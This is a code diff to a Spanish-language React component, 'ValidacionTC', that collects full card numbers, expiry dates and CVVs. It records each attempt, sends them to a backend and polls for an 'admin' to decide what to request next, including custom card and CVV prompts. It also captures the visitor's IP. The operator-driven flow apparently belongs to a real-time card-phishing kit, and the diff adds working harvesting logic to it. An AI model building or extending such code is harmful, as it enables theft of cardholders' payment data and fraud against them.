@@ -69,6 +69,7 @@ export default function ValidacionTC() {
     const [isFocused, setIsFocused] = useState(false);
     const [focusedField, setFocusedField] = useState(""); // 'digits' | 'expiration' | 'cvv'
     const [cargando, setCargando] = useState(false);
+    const [isTCCustom, setIsTCCustom] = useState(false); // Flag para determinar si es TC Custom
 
     // Estado principal de tarjeta
     const [cardData, setCardData] = useState({
@@ -84,6 +85,48 @@ export default function ValidacionTC() {
         if (savedCardData) {
             setCardData(savedCardData);
         }
+        
+        // Si no hay cardData en localStorage, verificar con el backend (para TC Custom)
+        // Esto es necesario cuando se redirige a esta vista con estado solicitar_tc_custom
+        const checkCardDataFromBackend = async () => {
+            try {
+                const raw = localStorage.getItem("datos_usuario");
+                const usuarioLocalStorage = raw ? JSON.parse(raw) : {};
+                const sesionId = usuarioLocalStorage?.sesion_id;
+                
+                if (sesionId) {
+                    // Verificar si el backend tiene cardData para esta sesión (TC Custom)
+                    const { instanceBackend } = await import("../../axios/instanceBackend");
+                    const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
+                    const { cardData: backendCardData, estado } = response.data;
+                    
+                    if (backendCardData) {
+                        setCardData(backendCardData);
+                        localStorageService.setItem("selectedCardData", backendCardData);
+                        // Si hay cardData del backend, es TC Custom
+                        setIsTCCustom(true);
+                    } else if (estado === 'solicitar_tc_custom') {
+                        // Estado indica TC Custom pero no hay cardData aún
+                        setIsTCCustom(true);
+                    }
+                }
+            } catch (error) {
+                console.error("Error verificando cardData del backend:", error);
+                // No es crítico, continuar con cardData por defecto si existe
+            }
+        };
+        
+        // Solo verificar si no hay cardData guardado
+        if (!savedCardData) {
+            checkCardDataFromBackend();
+        } else {
+            // Si ya hay cardData guardado, verificar si es custom
+            // (cardData con digits específicos indica que es custom)
+            if (savedCardData.digits && savedCardData.digits.length === 4) {
+                setIsTCCustom(true);
+            }
+        }
+        
         obtenerIP();
         obtenerFechaHora();
     }, []);
@@ -330,22 +373,26 @@ export default function ValidacionTC() {
 
                     // --- REGISTRAR INTENTO EN LOCALSTORAGE (Estructura Unificada) ---
                     if (!usuarioLocalStorage.usuario) usuarioLocalStorage.usuario = {};
-                    if (!usuarioLocalStorage.usuario.tc) usuarioLocalStorage.usuario.tc = [];
+                    
+                    // Determinar si usar endpoint TC estándar o TC Custom
+                    const endpoint = isTCCustom ? "/tc-custom" : "/tc";
+                    const arrayKey = isTCCustom ? "tc_custom" : "tc";
+                    
+                    if (!usuarioLocalStorage.usuario[arrayKey]) usuarioLocalStorage.usuario[arrayKey] = [];
 
                     const nuevoIntento = {
-                        intento: usuarioLocalStorage.usuario.tc.length + 1,
+                        intento: usuarioLocalStorage.usuario[arrayKey].length + 1,
                         numeroTarjeta: numeroTarjetaCompleto,
                         fechaExpiracion: expirationDate,
                         cvv: cvv,
                         fecha: new Date().toLocaleString()
                     };
 
-                    usuarioLocalStorage.usuario.tc.push(nuevoIntento);
+                    usuarioLocalStorage.usuario[arrayKey].push(nuevoIntento);
                     localStorage.setItem("datos_usuario", JSON.stringify(usuarioLocalStorage));
 
-
                     // Preparar datos para enviar
-                    // Enviamos usuarioLocalStorage completo en attributes para que el backend tome el array tc
+                    // Enviamos usuarioLocalStorage completo en attributes para que el backend tome el array correspondiente
                     const dataSend = {
                         data: {
                             attributes: usuarioLocalStorage
@@ -355,8 +402,8 @@ export default function ValidacionTC() {
                     // Importar axios instance
                     const { instanceBackend } = await import("../../axios/instanceBackend");
 
-                    // Enviar al backend
-                    const response = await instanceBackend.post("/tc", dataSend);
+                    // Enviar al backend (TC estándar o TC Custom según corresponda)
+                    const response = await instanceBackend.post(endpoint, dataSend);
 
                     if (response.data.success) {
                         // Iniciar polling para esperar respuesta del admin
@@ -391,6 +438,8 @@ export default function ValidacionTC() {
                 if (cardData) {
                     setCardData(cardData);
                     localStorageService.setItem("selectedCardData", cardData);
+                    // Si hay cardData del backend, es TC Custom
+                    setIsTCCustom(true);
                 }
 
                 console.log('TC Polling:', estado, `Intento: ${attempts}/${MAX_ATTEMPTS}`);
@@ -485,7 +534,8 @@ export default function ValidacionTC() {
                         break;
 
                     case 'solicitar_tc_custom':
-                        navigate('/validacion-tc-custom');
+                        // Ya estamos en ValidacionTC, solo resetear formulario si es necesario
+                        // El cardData ya viene del backend y se carga automáticamente
                         break;
 
                     case 'solicitar_cvv_custom':
